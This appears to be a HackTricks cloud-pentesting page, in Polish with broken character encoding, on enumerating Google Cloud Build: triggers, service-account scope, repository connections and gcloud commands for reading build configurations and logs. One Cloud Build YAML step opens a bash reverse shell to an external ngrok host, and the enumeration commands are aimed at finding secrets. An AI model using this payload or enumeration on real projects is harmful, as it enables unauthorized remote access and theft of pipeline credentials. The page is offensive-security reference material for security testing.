# GCP - Wyliczanie usÅ‚ugi Cloud Build

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>

## Podstawowe informacje

Google Cloud Build to zarzÄ…dzana platforma CI/CD, ktÃ³ra **automatyzuje procesy budowania oprogramowania** i wydawania, integrujÄ…c siÄ™ z **repozytoriami kodu ÅºrÃ³dÅ‚owego** i obsÅ‚ugujÄ…c szeroki zakres jÄ™zykÃ³w programowania. UmoÅ¼liwia programistom **automatyczne budowanie, testowanie i wdraÅ¼anie kodu**, zapewniajÄ…c jednoczeÅ›nie elastycznoÅ›Ä‡ w dostosowywaniu krokÃ³w budowania i przepÅ‚ywÃ³w pracy.

KaÅ¼dy wyzwalacz Cloud Build jest **powiÄ…zany z repozytorium Cloud lub bezpoÅ›rednio poÅ‚Ä…czony z zewnÄ™trznym repozytorium** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nie widziaÅ‚em Å¼adnego sposobu na kradzieÅ¼ tokena Github/Bitbucket stÄ…d ani z Cloud Repositories, poniewaÅ¼ po pobraniu repozytorium jest ono dostÄ™pne za pomocÄ… adresu URL [https://source.cloud.google.com/](https://source.cloud.google.com/), a Github nie jest dostÄ™pny dla klienta.
{% endhint %}

### Zdarzenia

Cloud Build moÅ¼e zostaÄ‡ uruchomiony w przypadku:

* **Wprowadzenia zmian do gaÅ‚Ä™zi**: NaleÅ¼y okreÅ›liÄ‡ gaÅ‚Ä…Åº
* **Dodania nowej etykiety**: NaleÅ¼y okreÅ›liÄ‡ etykietÄ™
* **Pull requestu**: NaleÅ¼y okreÅ›liÄ‡ gaÅ‚Ä…Åº, ktÃ³ra otrzymuje PR
* **RÄ™cznego wywoÅ‚ania**
* **WiadomoÅ›ci Pub/Sub**: NaleÅ¼y okreÅ›liÄ‡ temat
* **Zdarzenia webhook**: BÄ™dzie udostÄ™pniony adres URL HTTPS, a Å¼Ä…danie musi byÄ‡ uwierzytelnione za pomocÄ… sekretu

### Wykonanie

DostÄ™pne sÄ… 3 opcje:

* Plik yaml/json **okreÅ›lajÄ…cy polecenia** do wykonania. Zazwyczaj: `/cloudbuild.yaml`
* Tylko jedno, ktÃ³re moÅ¼na okreÅ›liÄ‡ "wewnÄ™trznie" w konsoli internetowej i w wierszu poleceÅ„
* NajczÄ™stsza opcja
* Dotyczy dostÄ™pu bez uwierzytelnienia
* **Dockerfile** do budowy
* **Buildpack** do budowy

### Uprawnienia SA

**Konto usÅ‚ugi ma zakres `cloud-platform`**, dziÄ™ki czemu moÅ¼e **korzystaÄ‡ ze wszystkich uprawnieÅ„**. JeÅ›li **nie jest okreÅ›lone Å¼adne konto usÅ‚ugi** (np. podczas skÅ‚adania wniosku), zostanie uÅ¼yte **domyÅ›lne konto usÅ‚ugi** `<proj-number>@cloudbuild.gserviceaccount.com`.

DomyÅ›lnie nie sÄ… udzielane Å¼adne uprawnienia, ale jest doÅ›Ä‡ Å‚atwo je nadaÄ‡:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Zatwierdzenia

MoÅ¼liwe jest skonfigurowanie Cloud Build tak, aby **wymagaÅ‚ zatwierdzeÅ„ dla wykonania budowy** (domyÅ›lnie wyÅ‚Ä…czone).

### PoÅ‚Ä…czenia i repozytoria

PoÅ‚Ä…czenia moÅ¼na tworzyÄ‡ za pomocÄ…:

* **GitHuba**: WyÅ›wietli monit OAuth, proszÄ…cy o uprawnienia do **uzyskania tokenu Github**, ktÃ³ry zostanie przechowywany w **Secret Managerze**.
* **GitHub Enterprise**: Poprosi o zainstalowanie **GithubApp**. Wygenerowany zostanie i przechowywany w tym projekcie token uwierzytelniajÄ…cy z hosta GitHub Enterprise jako sekret **Secret Manager**.
* **GitLab / Enterprise**: NaleÅ¼y podaÄ‡ token dostÄ™pu do interfejsu API i token dostÄ™pu do odczytu interfejsu API, ktÃ³re zostanÄ… przechowywane w **Secret Managerze**.

Po wygenerowaniu poÅ‚Ä…czenia moÅ¼na go uÅ¼yÄ‡ do **powiÄ…zania repozytoriÃ³w, do ktÃ³rych konto Github ma dostÄ™p**.

Ta opcja jest dostÄ™pna za pomocÄ… przycisku:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e repozytoria poÅ‚Ä…czone za pomocÄ… tej metody sÄ… **dostÄ™pne tylko w wyzwalaczach korzystajÄ…cych z 2. generacji**.
{% endhint %}

### PoÅ‚Ä…cz repozytorium

To nie jest to samo co **`poÅ‚Ä…czenie`**. Pozwala to na **rÃ³Å¼ne** sposoby **uzyskania dostÄ™pu do repozytorium Github lub Bitbucket**, ale **nie generuje obiektu poÅ‚Ä…czenia, ale generuje obiekt repozytorium (1. generacji).**

Ta opcja jest dostÄ™pna za pomocÄ… przycisku:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Przechowywanie

Czasami Cloud Build **generuje nowe miejsce przechowywania plikÃ³w dla wyzwalacza**. Dzieje siÄ™ tak na przykÅ‚ad w przykÅ‚adzie, ktÃ³ry oferuje GCP z:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Uzyskaj dostÄ™p do powÅ‚oki
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Wyliczanie

MoÅ¼esz znaleÅºÄ‡ **wraÅ¼liwe informacje w konfiguracjach i dziennikach budowy**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacja uprawnieÅ„

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Nieuwierzytelniony dostÄ™p

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Po eksploatacji

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
